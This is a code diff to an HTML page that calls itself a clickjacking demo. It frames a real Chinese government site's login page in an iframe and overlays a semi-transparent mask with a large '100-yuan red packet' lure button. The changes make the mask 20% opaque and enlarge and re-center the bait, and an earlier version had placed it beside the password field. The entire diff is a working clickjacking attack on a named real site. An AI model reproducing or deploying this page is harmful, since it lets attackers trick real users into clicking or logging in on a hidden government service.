@@ -2,7 +2,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>点击劫持演示（登录页-错位版）</title>
+    <title>点击劫持演示（登录页-20%透明版）</title>
     <style>
         body {
             margin: 0;
@@ -20,24 +20,23 @@
             border: none;
             z-index: 1;
         }
-        /* 前景实心遮罩 */
+        /* 前景遮罩：20%透明（能清晰看到背景） */
         .mask {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #ffffff;
+            background: rgba(255, 255, 255, 0.2); /* 20%透明，不影响背景可见度 */
             z-index: 2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        /* 红包按钮：偏右错位 */
+        /* 红包按钮 */
         .red-packet {
-            position: absolute;
-            top: 45%;
-            left: 58%; /* 把红包移到密码框旁边 */
-            transform: translate(-50%, -50%);
-            width: 180px;
-            height: 240px;
+            width: 220px;
+            height: 300px;
             background: linear-gradient(135deg, #e53935, #ff5252);
             border-radius: 16px;
             color: white;
@@ -50,21 +49,21 @@
             z-index: 3;
         }
         .red-packet .title {
-            font-size: 24px;
+            font-size: 28px;
             font-weight: bold;
-            margin-bottom: 12px;
+            margin-bottom: 15px;
         }
         .red-packet .desc {
-            font-size: 14px;
+            font-size: 16px;
             opacity: 0.95;
         }
     </style>
 </head>
 <body>
     <!-- 目标登录页 -->
-    <iframe src="https://ywt.scjgj.cq.gov.cn/login"></iframe>
+    <iframe src="https://ywt.scjgj.cq.gov.cn/"></iframe>
 
-    <!-- 实心遮罩+错位红包 -->
+    <!-- 20%透明遮罩+红包诱导层 -->
     <div class="mask">
         <div class="red-packet">
             <div class="title">百元红包</div>
